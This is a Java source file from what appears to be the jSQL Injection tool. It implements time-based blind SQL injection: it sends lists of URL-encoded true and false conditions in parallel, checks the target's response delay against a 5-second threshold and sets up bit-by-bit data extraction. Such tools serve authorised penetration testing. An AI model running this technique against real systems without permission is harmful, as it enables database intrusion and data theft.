package com.jsql.model.blind;

import java.util.ArrayList;
import java.util.Collection;
import java.util.List;
import java.util.concurrent.ExecutionException;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;

import org.apache.log4j.Logger;

import com.jsql.exception.PreparationException;
import com.jsql.view.GUIMediator;

/**
 * A time attack class using thread asynchronisation.
 */
public class ConcreteTimeInjection extends AbstractBlindInjection<TimeCallable> {
    /**
     * Waiting time in seconds, if response time is above
     * then the SQL query is false.
     */
    public static final long SLEEP = 5;

    /**
     *  Time based works by default, many tests will
     *  change it to false if it isn't confirmed.
     */
    private boolean isTimeInjectable = true;

    /**
     * Log4j logger sent to view.
     */
    private static final Logger LOGGER = Logger.getLogger(ConcreteTimeInjection.class);

    /**
     * Create time attack initialisation.
     * If every false requests are under 5 seconds and every true are below 5 seconds,
     * then time attack is confirmed. 
     */
    public ConcreteTimeInjection() {
        /*
         * Every FALSE SQL statements will be checked,
         * more statements means a more robust application
         */
        String[] falseTest = {"true=false", "true%21=true", "false%21=false", "1=2", "1%21=1", "2%21=2"};

        /*
         * Every TRUE SQL statements will be checked,
         * more statements means a more robust application
         */
        String[] trueTest = {"true=true", "false=false", "true%21=false", "1=1", "2=2", "1%21=2"};

        // Check if the user wants to stop the preparation
        if (GUIMediator.model().stopFlag) {
            return;
        }

        /*
         *  Parallelize the call to the FALSE statements,
         *  it will use inject() from the model
         */
        ExecutorService executorFalseMark = Executors.newCachedThreadPool();
        Collection<TimeCallable> listCallableFalse = new ArrayList<TimeCallable>();
        for (String urlTest: falseTest) {
            listCallableFalse.add(new TimeCallable(urlTest));
        }
        
        // Begin the url requests
        List<Future<TimeCallable>> listFalseMark = null;
        try {
            listFalseMark = executorFalseMark.invokeAll(listCallableFalse);
        } catch (InterruptedException e) {
            LOGGER.error(e, e);
        }
        executorFalseMark.shutdown();

        /*
         * If one FALSE query makes less than X seconds,
         * then the test is a failure => exit
         * Allow the user to stop the loop
         */
        try {
            for (Future<TimeCallable> falseMark: listFalseMark) {
                if (GUIMediator.model().stopFlag) {
                    return;
                }
                if (falseMark.get().isTrue()) {
                    isTimeInjectable = false;
                    return;
                }
            }
        } catch (InterruptedException e) {
            LOGGER.error(e, e);
        } catch (ExecutionException e) {
            LOGGER.error(e, e);
        }

        /*
         *  Parallelize the call to the TRUE statements,
         *  it will use inject() from the model
         */
        ExecutorService executorTrueMark = Executors.newCachedThreadPool();
        Collection<TimeCallable> listCallableTrue = new ArrayList<TimeCallable>();
        for (String urlTest: trueTest) {
            listCallableTrue.add(new TimeCallable(urlTest));
        }
        
        // Begin the url requests
        List<Future<TimeCallable>> listTrueMark;
        try {
            listTrueMark = executorTrueMark.invokeAll(listCallableTrue);
        } catch (InterruptedException e) {
            LOGGER.error(e, e);
            return;
        }
        executorTrueMark.shutdown();

        /*
         * If one TRUE query makes more than X seconds,
         * then the test is a failure => exit.
         * Allow the user to stop the loop
         */
        try {
            for (Future<TimeCallable> falseMark: listTrueMark) {
                if (GUIMediator.model().stopFlag) {
                    return;
                }
                if (!falseMark.get().isTrue()) {
                    isTimeInjectable = false;
                    return;
                }
            }
        } catch (InterruptedException e) {
            LOGGER.error(e, e);
        } catch (ExecutionException e) {
            LOGGER.error(e, e);
        }
    }
    
    @Override
    public TimeCallable getCallable(String string, int indexCharacter, boolean isLengthTest) {
        return new TimeCallable(string, indexCharacter, isLengthTest);
    }

    @Override
    public TimeCallable getCallable(String string, int indexCharacter, int bit) {
        return new TimeCallable(string, indexCharacter, bit);
    }

    @Override
    public boolean isInjectable() throws PreparationException {
        if (GUIMediator.model().stopFlag) {
            throw new PreparationException();
        }

        TimeCallable blindTest = new TimeCallable("0%2b1=1");
        try {
            blindTest.call();
        } catch (Exception e) {
            LOGGER.error(e, e);
        }

        return this.isTimeInjectable && blindTest.isTrue();
    }

    @Override
    public String getInfoMessage() {
        return "Asking server \"Is this bit true?\", if delay does not exceed 5 seconds then response is true.\n";
    }
}
